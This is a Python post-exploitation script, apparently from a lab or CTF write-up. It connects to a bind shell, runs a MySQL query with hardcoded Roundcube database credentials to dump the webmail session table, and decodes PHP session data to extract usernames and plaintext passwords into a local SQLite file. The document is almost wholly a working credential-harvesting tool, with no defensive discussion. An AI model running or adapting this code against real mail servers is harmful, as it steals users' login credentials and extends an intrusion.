```python
import socket

import time

import sqlite3

import base64

import re

from typing import Dict, Optional

  

HOST = "127.0.0.1"

PORT = 4444

DB_FILE = "users.db"

  

class SessionProcessor:

    def __init__(self, db_path: str = DB_FILE):

        self.db_path = db_path

        self.init_database()

    def init_database(self):

        """Initialize SQLite database with users table"""

        conn = sqlite3.connect(self.db_path)

        cursor = conn.cursor()

        cursor.execute('''

            CREATE TABLE IF NOT EXISTS user (

                user_id INTEGER PRIMARY KEY,

                username TEXT UNIQUE NOT NULL,

                password TEXT NOT NULL

            )

        ''')

        conn.commit()

        conn.close()

        print(f"[✓] Database initialized: {self.db_path}")

    def decode_php_session(self, encoded_data: str) -> Dict[str, str]:

        """Decode base64 encoded PHP session data and extract credentials"""

        try:

            # Decode base64

            decoded_bytes = base64.b64decode(encoded_data)

            decoded_str = decoded_bytes.decode('utf-8', errors='ignore')

            session_data = {}

            # Extract username

            username_match = re.search(r'username\|s:\d+:"([^"]+)"', decoded_str)

            if username_match:

                session_data['username'] = username_match.group(1)

            # Extract password

            password_match = re.search(r'password\|s:\d+:"([^"]+)"', decoded_str)

            if password_match:

                session_data['password'] = password_match.group(1)

            # Extract user_id

            user_id_match = re.search(r'user_id\|i:(\d+)', decoded_str)

            if user_id_match:

                session_data['user_id'] = int(user_id_match.group(1))

            return session_data

        except Exception as e:

            print(f"[!] Error decoding session data: {e}")

            return {}

    def parse_mysql_output(self, output: str) -> list:

        """Parse MySQL table output and extract session data"""

        sessions = []

        lines = output.strip().split('\n')

        # Skip header lines and process data rows

        for line in lines:

            if line and not line.startswith('sess_id') and not line.startswith('+'):

                # Split by tabs (MySQL output format)

                parts = line.split('\t')

                if len(parts) >= 4:

                    sess_id = parts[0].strip()

                    changed = parts[1].strip()

                    ip = parts[2].strip()

                    vars_data = parts[3].strip()

                    if vars_data and len(vars_data) > 10:  # Valid base64 data

                        sessions.append((sess_id, changed, ip, vars_data))

        return sessions

    def store_user(self, user_id: int, username: str, password: str) -> bool:

        """Store user credentials in SQLite database"""

        try:

            conn = sqlite3.connect(self.db_path)

            cursor = conn.cursor()

            cursor.execute('''

                INSERT OR REPLACE INTO user (user_id, username, password)

                VALUES (?, ?, ?)

            ''', (user_id, username, password))

            conn.commit()

            conn.close()

            return True

        except Exception as e:

            print(f"[!] Error storing user {username}: {e}")

            return False

    def process_sessions(self, mysql_output: str) -> int:

        """Process all sessions from MySQL output and store credentials"""

        sessions = self.parse_mysql_output(mysql_output)

        processed_count = 0

        print(f"[+] Found {len(sessions)} sessions to process")

        for sess_id, changed, ip, vars_data in sessions:

            try:

                # Decode session data

                session_info = self.decode_php_session(vars_data)

                if session_info.get('username') and session_info.get('password'):

                    user_id = session_info.get('user_id', 0)

                    username = session_info.get('username')

                    password = session_info.get('password')

                    if self.store_user(user_id, username, password):

                        print(f"[✓] Stored user: {username} (ID: {user_id})")

                        processed_count += 1

            except Exception as e:

                print(f"[!] Error processing session {sess_id}: {e}")

        return processed_count

    def get_all_users(self):

        """Retrieve and display all stored users"""

        conn = sqlite3.connect(self.db_path)

        cursor = conn.cursor()

        cursor.execute('SELECT user_id, username, password FROM user ORDER BY user_id')

        users = cursor.fetchall()

        conn.close()

        if users:

            print(f"\n[✓] Found {len(users)} users in database:")

            print("-" * 70)

            print(f"{'User ID':<8} {'Username':<20} {'Password':<30}")

            print("-" * 70)

            for user_id, username, password in users:

                print(f"{user_id:<8} {username:<20} {password:<30}")

        else:

            print("[!] No users found in database")

  

def recv_all(sock, wait=0.5, timeout=4):

    """Receive all data from socket"""

    sock.settimeout(wait)

    data = b""

    start = time.time()

    try:

        while time.time() - start < timeout:

            try:

                chunk = sock.recv(4096)

                if not chunk:

                    break

                data += chunk

            except socket.timeout:

                break

    except Exception as e:

        print(f"[!] Error receiving data: {e}")

    return data.decode(errors="ignore")

  

def main():

    print(f"[+] Connecting to bind shell at {HOST}:{PORT}...")

    try:

        # Connect to bind shell

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((HOST, PORT))

        print("[✓] Connected.")

        time.sleep(1)

        # Send MySQL command to extract sessions

        cmd = "mysql -u roundcube -pfearsoff.org -e \"SELECT * FROM session;\" roundcube\n"

        print("[•] Sending MySQL command to extract sessions...")

        s.sendall(cmd.encode())

        time.sleep(4)  # Wait for response

        # Receive MySQL output

        output = recv_all(s, timeout=8)

        print("[✓] Received session data from MySQL")

        s.close()

        # Process sessions and store them in database

        processor = SessionProcessor()

        processed_count = processor.process_sessions(output)

        print(f"\n[✓] Successfully processed {processed_count} sessions")

        # Display all stored users

        processor.get_all_users()

    except ConnectionRefusedError:

        print(f"[!] Could not connect to {HOST}:{PORT}")

    except Exception as e:

        print(f"[!] Error: {e}")

  

if __name__ == "__main__":

    main()
    
```


![[Pasted image 20250801115925.png]]

![[Pasted image 20250801120043.png]]
